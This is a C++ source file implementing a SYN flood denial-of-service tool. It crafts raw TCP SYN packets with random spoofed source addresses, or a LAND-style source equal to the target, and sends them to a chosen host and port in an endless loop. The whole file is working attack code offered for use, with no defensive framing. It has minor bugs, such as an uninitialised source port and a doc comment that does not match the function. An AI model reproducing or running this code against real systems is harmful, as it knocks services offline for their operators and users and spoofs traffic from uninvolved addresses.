#include "include/syn_flood.hpp"

/*
    checksum calculation

    @param ptr
        pointer of datagram
    @param nbytes
        length of header
    @return header checksum value
*/ 
struct timespec ts;

unsigned short chksum(unsigned short *ptr, int nbytes){
    long sum;
    unsigned short oddbyte;
    short res;

    sum = 0;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    res = (short)~sum;

    return res;
}
/*
    syn flooding

    @param sock
        initialized ipv4 tcp raw socket
    @param dest_ip
        destination IP
    @param src_ip
        source IP. If it is null, source IP will be random
    @param port
        destination port. Default is 80
    @param r
        for random ip and port
*/
int syn_flood(int sock, char dest_ip[], int dport, bool flagLand)
{
    random_device r;
    int sport;
    char src_ip[16];
    char datagram[4096];
    struct iphdr *ip_header = (struct iphdr *)datagram;
    struct tcphdr *tcp_header = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sckaddr_in;
    struct pseudo_header psd_hdr;

    while (1) {
        if (flagLand)
            strcpy(src_ip, dest_ip);
        else {
            std::sprintf(src_ip, "%u.%u.%u.%u",
                (unsigned int)r() % 255,
                (unsigned int)r() % 255,
                (unsigned int)r() % 255,
                (unsigned int)r() % 255);
        }
        
        sckaddr_in.sin_family = AF_INET;
        sckaddr_in.sin_addr.s_addr = inet_addr(dest_ip);

        sckaddr_in.sin_port = htons(dport);

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = sizeof (struct ip) + sizeof(struct tcphdr);
        ip_header->id = sport % 65536;
        ip_header->frag_off = 0;
        ip_header->ttl = 255;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        ip_header->saddr = inet_addr(src_ip); 
        ip_header->daddr = inet_addr(dest_ip);
        ip_header-> check = chksum((unsigned short *) datagram, ip_header->tot_len >> 1);

        tcp_header->source = htons(sport);
        tcp_header->dest = htons(dport);
        tcp_header->seq = 0;
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->fin = 0;
        tcp_header->syn = 1;
        tcp_header->rst = 0;
        tcp_header->psh = 0;
        tcp_header->ack = 0;
        tcp_header->urg = 0;
        tcp_header->window = htons(5840);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        psd_hdr.src_addr = inet_addr(src_ip);
        psd_hdr.dest_addr = inet_addr(dest_ip);
        psd_hdr.placeholder = 0;
        psd_hdr.protocol = IPPROTO_TCP;
        psd_hdr.tcp_length = htons(20);

        memcpy(&psd_hdr.tcp, tcp_header, sizeof(struct tcphdr));

        tcp_header->check = chksum((unsigned short*) &psd_hdr, sizeof(struct pseudo_header));

        int opt = 1;
        const int *val = &opt;
        if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (opt)) < 0)
        {
            std::cerr << "Error message : " << strerror(errno) << endl << "Error code:" << errno << std::endl;
            exit(0);
        }
        
        if (sendto (sock,
                    datagram,
                    ip_header->tot_len,
                    0,
                    (struct sockaddr *) &sckaddr_in,
                    sizeof (sckaddr_in)) < 0)
        {
            std::cerr << "Unknown error occured" << std::endl;

            return -1;
        }
    }

    return 0;
}